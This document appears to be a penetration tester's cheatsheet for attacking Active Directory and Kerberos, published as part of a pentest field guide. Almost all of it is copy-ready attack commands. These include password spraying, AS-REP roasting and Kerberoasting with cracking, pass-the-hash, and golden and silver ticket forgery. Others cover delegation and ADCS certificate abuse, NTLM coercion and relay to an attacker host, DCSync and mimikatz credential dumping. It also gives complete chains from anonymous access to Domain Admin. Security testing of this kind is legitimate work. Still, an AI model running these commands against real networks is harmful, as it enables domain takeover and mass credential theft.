---
tags:
  - hack-notes
  - active-directory
---

# Active Directory and Kerberos Cheatsheet

## Table of Contents

- [Conventions and Variables](#conventions-and-variables)
- [Unauthenticated Enumeration](#unauthenticated-enumeration)
- [Authenticated Enumeration](#authenticated-enumeration)
- [BloodHound Collection](#bloodhound-collection)
- [BloodHound Cypher Tips](#bloodhound-cypher-tips)
- [Kerberos User Enumeration](#kerberos-user-enumeration)
- [AS-REP Roasting](#as-rep-roasting)
- [Kerberoasting](#kerberoasting)
- [Cracking Kerberos Hashes](#cracking-kerberos-hashes)
- [Pass-the-Hash and Overpass-the-Hash](#pass-the-hash-and-overpass-the-hash)
- [Pass-the-Ticket](#pass-the-ticket)
- [Golden, Silver, and Diamond Tickets](#golden-silver-and-diamond-tickets)
- [Delegation Abuse](#delegation-abuse)
- [ADCS with Certipy](#adcs-with-certipy)
- [Shadow Credentials and PKINIT](#shadow-credentials-and-pkinit)
- [Coercion and Relay](#coercion-and-relay)
- [DCSync](#dcsync)
- [GPO Abuse](#gpo-abuse)
- [LAPS Read](#laps-read)
- [Domain Trusts](#domain-trusts)
- [Mimikatz Key Commands](#mimikatz-key-commands)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## Conventions and Variables

bash

```bash
DC=dc01.corp.local        # Domain controller FQDN
DCIP=10.10.10.10          # Domain controller IP
DOMAIN=corp.local         # FQDN of the domain
NB=CORP                   # NetBIOS short name
USER=jdoe                 # Username
PASS='Summer2026!'        # Cleartext password
HASH=aad3b...:5f4dcc...   # LM:NT pair (use 32 zeros for empty LM)
```

Keep `/etc/hosts` mapping the DC IP to its FQDN and the domain name so Kerberos and LDAP referrals resolve. Kerberos is clock sensitive, so sync time to the DC before requesting tickets.

bash

```bash
echo "$DCIP $DC $DOMAIN" | sudo tee -a /etc/hosts   # Map DC for SPN and referral resolution
sudo ntpdate $DCIP                                  # Sync clock (or use ntpdate -u / rdate)
sudo timedatectl set-ntp false                      # Stop drift from overwriting manual sync
```

---

## Unauthenticated Enumeration

Anonymous and null sessions still leak the domain naming context, users, and policy on many networks.

bash

```bash
# RootDSE leak: naming contexts, DC name, supported controls (no creds)
ldapsearch -x -H ldap://$DCIP -s base -b "" defaultNamingContext

# Anonymous bind dumping the directory base DN
ldapsearch -x -H ldap://$DCIP -b "DC=corp,DC=local"

# Pull just user objects via anonymous bind
ldapsearch -x -H ldap://$DCIP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# enum4linux-ng: RID cycling, shares, policy, OS info
enum4linux-ng -A $DCIP

# rpcclient null session
rpcclient -U "" -N $DCIP
```

Useful rpcclient verbs once a null or guest session lands:

bash

```bash
rpcclient $> enumdomusers          # List domain users
rpcclient $> enumdomgroups         # List domain groups
rpcclient $> querydominfo          # Domain summary and lockout policy
rpcclient $> getdompwinfo          # Password policy (min length, complexity)
rpcclient $> lookupnames krbtgt    # Name to SID
rpcclient $> lookupsids S-1-5-...  # SID to name
rpcclient $> queryuser 0x1f4       # Detail by RID (0x1f4 = 500 = Administrator)
```

SID brute force when enumdomusers is blocked but lookups work:

bash

```bash
# Impacket: derive domain SID then walk RIDs for valid principals
lookupsid.py $NB/guest@$DCIP -no-pass                 # Guest, often allowed
lookupsid.py "$NB/$USER:$PASS"@$DCIP                   # Authenticated RID walk

# NetExec equivalent
nxc smb $DCIP -u guest -p '' --rid-brute 10000
```

SMB share and policy peek without creds:

bash

```bash
smbclient -L //$DCIP -N                                # List shares as anonymous
nxc smb $DCIP -u '' -p '' --shares                     # Null session shares
nxc smb $DCIP -u guest -p '' --pass-pol                # Lockout threshold before spraying
```

---

## Authenticated Enumeration

With any valid domain credential the directory opens up. Dump it once, mine it offline.

bash

```bash
# ldapdomaindump: HTML, JSON, and GREP output for users, groups, computers, policy
ldapdomaindump -u "$NB\\$USER" -p "$PASS" -o loot/ $DCIP

# windapsearch: targeted LDAP queries
windapsearch -d $DOMAIN -u "$USER@$DOMAIN" -p "$PASS" --dc-ip $DCIP -U   # Users
windapsearch -d $DOMAIN -u "$USER@$DOMAIN" -p "$PASS" --dc-ip $DCIP -C   # Computers
windapsearch -d $DOMAIN -u "$USER@$DOMAIN" -p "$PASS" --dc-ip $DCIP -PU  # Privileged users
windapsearch -d $DOMAIN -u "$USER@$DOMAIN" -p "$PASS" --dc-ip $DCIP -m "Domain Admins"

# ldeep: rich, structured LDAP enumeration into a folder
ldeep ldap -u $USER -p "$PASS" -d $DOMAIN -s ldap://$DCIP all loot/ldeep
ldeep ldap -u $USER -p "$PASS" -d $DOMAIN -s ldap://$DCIP users
ldeep ldap -u $USER -p "$PASS" -d $DOMAIN -s ldap://$DCIP trusts
```

Direct LDAP filters worth memorizing (run with an authenticated ldapsearch bind):

bash

```bash
# Accounts with Kerberos pre-auth disabled (AS-REP roastable)
'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'

# Accounts with an SPN set (Kerberoastable)
'(&(objectClass=user)(servicePrincipalName=*))'

# Computers trusted for unconstrained delegation (TRUSTED_FOR_DELEGATION)
'(userAccountControl:1.2.840.113556.1.4.803:=524288)'

# Accounts allowed constrained delegation (msDS-AllowedToDelegateTo populated)
'(msDS-AllowedToDelegateTo=*)'

# Hosts that store a LAPS password attribute
'(ms-Mcs-AdmPwd=*)'
```

NetExec wraps most of this for fast triage:

bash

```bash
nxc ldap $DCIP -u $USER -p "$PASS" --asreproast asrep.txt   # Roastable users
nxc ldap $DCIP -u $USER -p "$PASS" --kerberoasting kerb.txt # SPN accounts
nxc ldap $DCIP -u $USER -p "$PASS" --trusted-for-delegation
nxc ldap $DCIP -u $USER -p "$PASS" --password-not-required
nxc smb  $DCIP -u $USER -p "$PASS" --users --groups --pass-pol
```

---

## BloodHound Collection

bash

```bash
# bloodhound-python (remote collector, no agent on host)
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -ns $DCIP -c All --zip

# DCOnly when you only have one credential and want stealth
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -ns $DCIP -c DCOnly --zip

# Kerberos auth instead of password
bloodhound-python -d $DOMAIN -u $USER -k -no-pass -ns $DCIP -c All --zip
```

bash

```bash
# SharpHound on a Windows foothold
SharpHound.exe -c All --zipfilename loot.zip
SharpHound.exe -c All --domain corp.local --ldapusername jdoe --ldappassword 'Summer2026!'

# SharpHound stealth or session-only collection
SharpHound.exe -c Session,LoggedOn --stealth
```

Load the resulting zip into the BloodHound GUI to query attack paths.

---

## BloodHound Cypher Tips

Run these in the Raw Query box. They surface paths the prebuilt queries miss.

```cypher
// Shortest paths from owned principals to Domain Admins
MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group))
WHERE g.name STARTS WITH "DOMAIN ADMINS@"
RETURN p

// Kerberoastable users that already have a path to high value
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(m {highvalue:true}))
RETURN p

// Find AS-REP roastable accounts
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

// Computers configured for unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Who can DCSync the domain (GetChanges + GetChangesAll)
MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain)
RETURN n.name

// Mark a node owned from the query box
MATCH (u:User {name:"JDOE@CORP.LOCAL"}) SET u.owned=true RETURN u

// First-degree object control from an owned user
MATCH p=(u {owned:true})-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AddMember|ForceChangePassword|AllowedToDelegate]->(t)
RETURN p
```

---

## Kerberos User Enumeration

kerbrute abuses Kerberos pre-auth replies to validate usernames without locking accounts.

bash

```bash
# Validate a username wordlist against the DC
kerbrute userenum -d $DOMAIN --dc $DCIP users.txt

# Spray a single password across valid users (watch lockout policy first)
kerbrute passwordspray -d $DOMAIN --dc $DCIP valid_users.txt 'Summer2026!'

# Brute one user (high lockout risk, use sparingly)
kerbrute bruteuser -d $DOMAIN --dc $DCIP passwords.txt jdoe
```

---

## AS-REP Roasting

Targets accounts with "do not require Kerberos pre-authentication" set. No password needed for the request itself.

bash

```bash
# Impacket GetNPUsers against a user list (no creds)
GetNPUsers.py $DOMAIN/ -dc-ip $DCIP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt

# With a valid credential, query LDAP for all preauth-disabled users automatically
GetNPUsers.py "$DOMAIN/$USER:$PASS" -dc-ip $DCIP -request -format hashcat -outputfile asrep.txt

# NetExec one-liner
nxc ldap $DCIP -u $USER -p "$PASS" --asreproast asrep.txt
```

```bash
# Rubeus equivalent on a Windows foothold
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

Crack with hashcat mode 18200 (see cracking section).

---

## Kerberoasting

Targets service accounts (an SPN is set). Any authenticated user can request the ticket, then crack it offline.

bash

```bash
# Impacket GetUserSPNs: list SPN accounts, then request tickets
GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DCIP                         # Enumerate only
GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DCIP -request -outputfile kerb.txt
GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DCIP -request-user svc_sql -outputfile kerb.txt

# Use a TGT instead of a password
GetUserSPNs.py -k -no-pass -dc-ip $DCIP $DOMAIN/$USER -request -outputfile kerb.txt

# NetExec one-liner
nxc ldap $DCIP -u $USER -p "$PASS" --kerberoasting kerb.txt
```

```bash
# Rubeus equivalent
Rubeus.exe kerberoast /outfile:kerb.txt /format:hashcat
Rubeus.exe kerberoast /user:svc_sql /nowrap          # Single target, no line wrap
```

Crack with hashcat mode 13100 (RC4) or 19600/19700 for AES tickets.

---

## Cracking Kerberos Hashes

bash

```bash
# AS-REP roast (etype 23, RC4)
hashcat -m 18200 asrep.txt rockyou.txt -O

# Kerberoast TGS-REP (etype 23, RC4)
hashcat -m 13100 kerb.txt rockyou.txt -O

# Kerberoast AES128 / AES256 tickets
hashcat -m 19600 kerb_aes128.txt rockyou.txt
hashcat -m 19700 kerb_aes256.txt rockyou.txt

# NTLM (from SAM or NTDS dumps)
hashcat -m 1000 nthashes.txt rockyou.txt -O

# With a rule set for better coverage
hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

| Hash | Mode |
|------|------|
| AS-REP RC4 | 18200 |
| Kerberoast RC4 | 13100 |
| Kerberoast AES128 | 19600 |
| Kerberoast AES256 | 19700 |
| NTLM | 1000 |
| NetNTLMv2 | 5600 |

---

## Pass-the-Hash and Overpass-the-Hash

Pass-the-hash reuses an NT hash directly. Overpass-the-hash converts a hash or key into a Kerberos TGT.

bash

```bash
# NetExec PtH across protocols
nxc smb   $DCIP -u administrator -H $HASH
nxc winrm $DCIP -u administrator -H $HASH -x whoami
nxc mssql $DCIP -u sa -H $HASH

# Impacket execution with a hash
psexec.py  -hashes $HASH administrator@$DCIP
wmiexec.py -hashes $HASH administrator@$DCIP
evil-winrm -i $DCIP -u administrator -H 5f4dcc...     # NT only for evil-winrm
```

bash

```bash
# Overpass-the-hash: turn an NT or AES key into a TGT (Impacket)
getTGT.py $DOMAIN/$USER -hashes $HASH -dc-ip $DCIP
getTGT.py $DOMAIN/$USER -aesKey <aes256-key> -dc-ip $DCIP
export KRB5CCNAME=$USER.ccache
wmiexec.py -k -no-pass $DOMAIN/$USER@$DC
```

```bash
# Rubeus overpass-the-hash producing a usable TGT
Rubeus.exe asktgt /user:jdoe /rc4:5f4dcc... /ptt
Rubeus.exe asktgt /user:jdoe /aes256:<key> /ptt
```

---

## Pass-the-Ticket

Inject an existing ticket into the current session.

bash

```bash
# Linux: point at the ccache and authenticate with -k
export KRB5CCNAME=/path/to/ticket.ccache
klist                                          # Verify the cached ticket
psexec.py -k -no-pass $DOMAIN/administrator@$DC

# Convert between kirbi (Windows) and ccache (Linux)
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi
```

```bash
# Windows with Rubeus or mimikatz
Rubeus.exe ptt /ticket:ticket.kirbi
mimikatz # kerberos::ptt ticket.kirbi
```

---

## Golden, Silver, and Diamond Tickets

Golden tickets forge a TGT using the krbtgt hash. Silver tickets forge a service ticket using a service account or computer hash. Diamond tickets modify a legitimately issued TGT to evade some detections.

bash

```bash
# Need: domain SID and the krbtgt NT (or AES) key first
secretsdump.py "$DOMAIN/$USER:$PASS"@$DC -just-dc-user krbtgt

# Golden ticket (Impacket): forge TGT as a fake admin
ticketer.py -nthash <krbtgt-nt> -domain-sid S-1-5-21-... -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass $DOMAIN/Administrator@$DC

# Silver ticket: forge a service ticket for one SPN using the service/computer hash
ticketer.py -nthash <service-nt> -domain-sid S-1-5-21-... -domain $DOMAIN \
  -spn cifs/$DC Administrator
```

```bash
# mimikatz golden and silver
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /krbtgt:<krbtgt-nt> /ptt
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /target:dc01.corp.local /service:cifs /rc4:<machine-nt> /ptt   # Silver

# Rubeus diamond ticket (modifies a real TGT, blends in better)
Rubeus.exe diamond /krbkey:<krbtgt-aes256> /user:jdoe /password:Summer2026! \
  /enctype:aes /ticketuser:Administrator /domain:corp.local /dc:dc01.corp.local /ptt
```

---

## Delegation Abuse

bash

```bash
# Find delegation across the domain (Impacket)
findDelegation.py "$DOMAIN/$USER:$PASS" -dc-ip $DCIP
```

Constrained delegation (S4U2Self then S4U2Proxy) when an account has msDS-AllowedToDelegateTo:

bash

```bash
# Impacket getST: impersonate a victim to a delegated SPN
getST.py -spn cifs/$DC -impersonate Administrator \
  -hashes :<svc-nt> $DOMAIN/svc_web -dc-ip $DCIP
export KRB5CCNAME=Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache
psexec.py -k -no-pass $DOMAIN/Administrator@$DC
```

Resource-based constrained delegation (RBCD): if you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer, point it at a computer account you control.

bash

```bash
# Create a controllable computer account (if MachineAccountQuota allows)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss123' \
  "$DOMAIN/$USER:$PASS" -dc-ip $DCIP

# Write the RBCD attribute on the victim machine
rbcd.py -delegate-from 'EVIL$' -delegate-to 'VICTIM$' -action write \
  "$DOMAIN/$USER:$PASS" -dc-ip $DCIP

# Abuse it: get a service ticket as Administrator to the victim
getST.py -spn cifs/victim.corp.local -impersonate Administrator \
  -hashes :<evil-nt> $DOMAIN/'EVIL$' -dc-ip $DCIP
```

Unconstrained delegation: capture TGTs that land on a host trusted for unconstrained delegation. Combine with a coercion (PrinterBug or PetitPotam) to force a DC to authenticate, then extract its TGT with Rubeus `monitor` or mimikatz `sekurlsa::tickets`.

---

## ADCS with Certipy

bash

```bash
# Find all templates and flag vulnerable ones
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DCIP -vulnerable -stdout
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DCIP -enabled -json
```

ESC1: template allows requester-supplied subjectAltName, so request a cert as a domain admin.

bash

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DCIP -ca CORP-CA \
  -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip $DCIP   # PKINIT to TGT and NT hash
```

ESC2 (any-purpose EKU) and ESC3 (enrollment-agent cert) are similar request abuses:

bash

```bash
# ESC3: get an enrollment agent cert, then request on behalf of admin
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca CORP-CA -template EnrollmentAgent
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca CORP-CA -template User \
  -on-behalf-of 'CORP\administrator' -pfx enrollmentagent.pfx
```

ESC4 (vulnerable template ACL): rewrite the template to be ESC1, exploit, then restore.

bash

```bash
certipy template -u "$USER@$DOMAIN" -p "$PASS" -template VulnTemplate -save-old
# ... exploit as ESC1 ...
certipy template -u "$USER@$DOMAIN" -p "$PASS" -template VulnTemplate \
  -configuration VulnTemplate.json   # Restore
```

ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA): any template lets you specify the SAN, same flow as ESC1. ESC7 (vulnerable CA ACL): grant yourself ManageCA or ManageCertificates and approve your own request. ESC8 (web enrollment NTLM relay):

bash

```bash
# Relay coerced machine auth to the CA web endpoint to get a cert
certipy relay -ca 10.10.10.20 -template DomainController
# Then coerce a DC (see Coercion and Relay) to feed the relay
```

---

## Shadow Credentials and PKINIT

If you have GenericWrite or AddKeyCredentialLink over a target, plant a key credential and authenticate as that object via PKINIT.

bash

```bash
# pywhisker: add a Key Credential to the target's msDS-KeyCredentialLink
pywhisker -d $DOMAIN -u $USER -p "$PASS" --target victim_user \
  --action add --filename shadowcred

# Authenticate with the generated PFX and recover the NT hash
certipy auth -pfx shadowcred.pfx -dc-ip $DCIP
gettgtpkinit.py -cert-pfx shadowcred.pfx -pfx-pass '' $DOMAIN/victim_user victim.ccache
```

```bash
# Whisker on Windows (PowerShell or Rubeus integration)
Whisker.exe add /target:victim_user
Rubeus.exe asktgt /user:victim_user /certificate:<base64-pfx> /password:"" /ptt
```

---

## Coercion and Relay

bash

```bash
# Responder: poison LLMNR/NBT-NS/mDNS to capture NetNTLM hashes
responder -I eth0 -wd

# mitm6: spoof IPv6 DNS to relay machine and user auth
mitm6 -d corp.local
```

```bash
# ntlmrelayx: relay captured auth to a target (disable SMB signing to relay to SMB)
ntlmrelayx.py -t ldap://$DCIP --escalate-user $USER      # Grant DCSync via LDAP
ntlmrelayx.py -t smb://10.10.10.30 -smb2support -c whoami
ntlmrelayx.py -t http://10.10.10.20/certsrv/certfnsh.asp --adcs --template DomainController
```

Force a machine to authenticate (feed Responder or ntlmrelayx):

bash

```bash
# PetitPotam (MS-EFSRPC) unauth coercion against a DC
petitpotam.py -d $DOMAIN -u $USER -p "$PASS" <attacker-ip> $DCIP
petitpotam.py <attacker-ip> $DCIP                       # Unauthenticated attempt

# PrinterBug (MS-RPRN) via dementor or Coercer
printerbug.py $DOMAIN/$USER:"$PASS"@$DCIP <attacker-ip>

# Coercer: spray every known coercion method
coercer coerce -u $USER -p "$PASS" -d $DOMAIN -t $DCIP -l <attacker-ip>
```

ESC8 chain: coerce a DC, relay to the CA web endpoint, get a DC certificate, then PKINIT for the DC hash and DCSync.

---

## DCSync

Replicate secrets from the DC. Requires GetChanges and GetChangesAll (Domain Admins, default; or granted via the relay above).

bash

```bash
# Dump everything from the DC
secretsdump.py "$DOMAIN/$USER:$PASS"@$DC -just-dc

# NT hashes only, no Kerberos keys or history
secretsdump.py "$DOMAIN/$USER:$PASS"@$DC -just-dc-ntlm

# Target a single account (krbtgt for golden tickets)
secretsdump.py "$DOMAIN/$USER:$PASS"@$DC -just-dc-user krbtgt

# With a hash instead of a password
secretsdump.py -hashes $HASH "$DOMAIN/$USER"@$DC -just-dc

# NetExec equivalent
nxc smb $DC -u $USER -p "$PASS" --ntds
```

```bash
# mimikatz DCSync for one account
lsadump::dcsync /domain:corp.local /user:krbtgt
```

---

## GPO Abuse

If you have write access to a GPO (check BloodHound `GPOControl`), push a scheduled task or immediate task to run code as SYSTEM on linked machines.

bash

```bash
# pyGPOAbuse: add an immediate scheduled task to a controllable GPO
pygpoabuse.py "$DOMAIN/$USER:$PASS" -gpo-id <GPO-GUID> \
  -command 'net localgroup administrators jdoe /add' -dc-ip $DCIP

# Find who can edit GPOs (Cypher in BloodHound)
# MATCH p=(u {owned:true})-[:GPOControl|GenericAll|WriteDacl]->(g:GPO) RETURN p
```

```powershell
# SharpGPOAbuse on Windows
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
  --Author CORP\admin --Command "cmd.exe" --Arguments "/c net user ..." --GPOName "Default Domain Policy"
```

---

## LAPS Read

Accounts with read rights over ms-Mcs-AdmPwd (or the new msLAPS-Password) can pull the local admin password of a machine.

bash

```bash
# NetExec module
nxc ldap $DCIP -u $USER -p "$PASS" -M laps
nxc smb  $DCIP -u $USER -p "$PASS" --laps                # Use LAPS pw for the connection

# ldapsearch directly for the legacy attribute
ldapsearch -x -H ldap://$DCIP -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=corp,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd dNSHostName

# pyLAPS reader
pyLAPS.py --action get -d $DOMAIN -u $USER -p "$PASS" --dc-ip $DCIP
```

---

## Domain Trusts

bash

```bash
# Enumerate trusts (Impacket)
nxc ldap $DCIP -u $USER -p "$PASS" -M enum_trusts
ldeep ldap -u $USER -p "$PASS" -d $DOMAIN -s ldap://$DCIP trusts

# Cross-domain golden ticket using a trust key (SID history injection)
secretsdump.py "$DOMAIN/$USER:$PASS"@$DC -just-dc-user "$NB\\childdc\$"

# raiseChild.py: automate child-to-parent escalation in a forest
raiseChild.py -target-exec $DCIP "$DOMAIN/$USER:$PASS"
```

```bash
# Forge an inter-realm ticket with an extra SID for the parent Enterprise Admins
ticketer.py -nthash <child-krbtgt> -domain-sid <child-sid> -domain child.corp.local \
  -extra-sid <parent-sid>-519 Administrator
```

---

## Mimikatz Key Commands

```bash
privilege::debug                       # Enable SeDebugPrivilege
sekurlsa::logonpasswords               # Dump credentials from LSASS memory
sekurlsa::ekeys                        # Kerberos encryption keys (AES, RC4)
sekurlsa::tickets /export              # Export all cached Kerberos tickets
lsadump::sam                           # Local SAM hashes
lsadump::secrets                       # LSA secrets (service account passwords)
lsadump::lsa /inject                   # Inject into LSASS to dump all accounts
lsadump::dcsync /user:krbtgt           # Replicate one account from the DC
kerberos::list /export                 # List and export tickets
kerberos::ptt ticket.kirbi             # Pass-the-ticket
kerberos::golden ...                   # Forge a golden or silver ticket
crypto::certificates /export           # Export machine certificates
vault::cred /patch                     # Windows Credential Vault secrets
```

---

## Common Workflows

End-to-end chain: anonymous to valid creds to Kerberoast to ADCS ESC1 to Domain Admin.

bash

```bash
# 1. From nothing: confirm the DC, pull policy and a user list anonymously
echo "$DCIP $DC $DOMAIN" | sudo tee -a /etc/hosts
enum4linux-ng -A $DCIP
lookupsid.py $NB/guest@$DCIP -no-pass | tee users_raw.txt
nxc smb $DCIP -u guest -p '' --pass-pol            # Check lockout before any spray

# 2. Validate usernames and find a foothold credential
kerbrute userenum -d $DOMAIN --dc $DCIP users.txt
GetNPUsers.py $DOMAIN/ -dc-ip $DCIP -usersfile valid_users.txt -no-pass -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt -O          # Crack an AS-REP for first creds

# 3. Authenticated triage and BloodHound
nxc smb $DCIP -u $USER -p "$PASS" --shares --users
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -ns $DCIP -c All --zip

# 4. Kerberoast a service account and crack it
GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DCIP -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 5. Hunt ADCS and exploit ESC1 to a Domain Admin certificate
certipy find -u "$svc@$DOMAIN" -p "$svcpass" -dc-ip $DCIP -vulnerable -stdout
certipy req -u "$svc@$DOMAIN" -p "$svcpass" -dc-ip $DCIP -ca CORP-CA \
  -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip $DCIP    # PKINIT to admin TGT and NT hash

# 6. DCSync as Domain Admin and harvest krbtgt
secretsdump.py -hashes :<admin-nt> "$DOMAIN/administrator"@$DC -just-dc
```

Coercion-to-relay path when no roastable account exists:

bash

```bash
# 1. Stand up the relay targeting LDAP to grant yourself DCSync rights
ntlmrelayx.py -t ldap://$DCIP --escalate-user $USER -smb2support

# 2. Coerce a DC or server to authenticate back to you
petitpotam.py -d $DOMAIN -u $USER -p "$PASS" <attacker-ip> $DCIP

# 3. Once relayed, you hold replication rights: DCSync the domain
secretsdump.py "$DOMAIN/$USER:$PASS"@$DC -just-dc
```

Delegation pivot (RBCD) from a single object-write primitive:

bash

```bash
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss123' "$DOMAIN/$USER:$PASS" -dc-ip $DCIP
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write "$DOMAIN/$USER:$PASS" -dc-ip $DCIP
getST.py -spn cifs/target.corp.local -impersonate Administrator -hashes :<evil-nt> $DOMAIN/'EVIL$' -dc-ip $DCIP
export KRB5CCNAME='Administrator@cifs_target.corp.local@CORP.LOCAL.ccache'
psexec.py -k -no-pass $DOMAIN/Administrator@target.corp.local
```

---

## Quick Reference

| Goal | Command |
|------|---------|
| Null session info | `enum4linux-ng -A $DCIP` |
| RID brute | `lookupsid.py $NB/guest@$DCIP -no-pass` |
| User enum | `kerbrute userenum -d $DOMAIN --dc $DCIP users.txt` |
| Password spray | `kerbrute passwordspray -d $DOMAIN --dc $DCIP users.txt 'Pass!'` |
| AS-REP roast | `GetNPUsers.py $DOMAIN/ -dc-ip $DCIP -usersfile u.txt -no-pass -format hashcat` |
| Kerberoast | `GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DCIP -request` |
| Crack AS-REP | `hashcat -m 18200 asrep.txt rockyou.txt` |
| Crack TGS | `hashcat -m 13100 kerb.txt rockyou.txt` |
| BloodHound | `bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -ns $DCIP -c All --zip` |
| ADCS find | `certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DCIP -vulnerable -stdout` |
| ESC1 request | `certipy req ... -template VulnTemplate -upn administrator@corp.local` |
| Cert to hash | `certipy auth -pfx administrator.pfx -dc-ip $DCIP` |
| Shadow cred | `pywhisker -d $DOMAIN -u $USER -p "$PASS" --target victim --action add` |
| Coerce DC | `petitpotam.py -d $DOMAIN -u $USER -p "$PASS" <attacker-ip> $DCIP` |
| Relay to LDAP | `ntlmrelayx.py -t ldap://$DCIP --escalate-user $USER` |
| DCSync | `secretsdump.py "$DOMAIN/$USER:$PASS"@$DC -just-dc` |
| Pass-the-hash | `nxc smb $DCIP -u administrator -H $HASH` |
| Get TGT (OPtH) | `getTGT.py $DOMAIN/$USER -hashes $HASH -dc-ip $DCIP` |
| Golden ticket | `ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator` |
| LAPS read | `nxc ldap $DCIP -u $USER -p "$PASS" -M laps` |

Hashcat modes: AS-REP `18200`, Kerberoast RC4 `13100`, AES128 `19600`, AES256 `19700`, NTLM `1000`, NetNTLMv2 `5600`.

---

## Related

- Checklists: [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md), [Assumed Breach](../Checklists/Assumed%20Breach.md)
- [NetExec and Impacket](NetExec%20and%20Impacket.md)
- [Windows Privilege Escalation](Windows%20Privilege%20Escalation.md)
- [Reverse Shells and File Transfer](Reverse%20Shells%20and%20File%20Transfer.md)
- [Pivoting and Tunneling](Pivoting%20and%20Tunneling.md)
- [OSINT and Recon](OSINT%20and%20Recon.md)
- [Nmap Cheatsheet](Nmap.md)

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
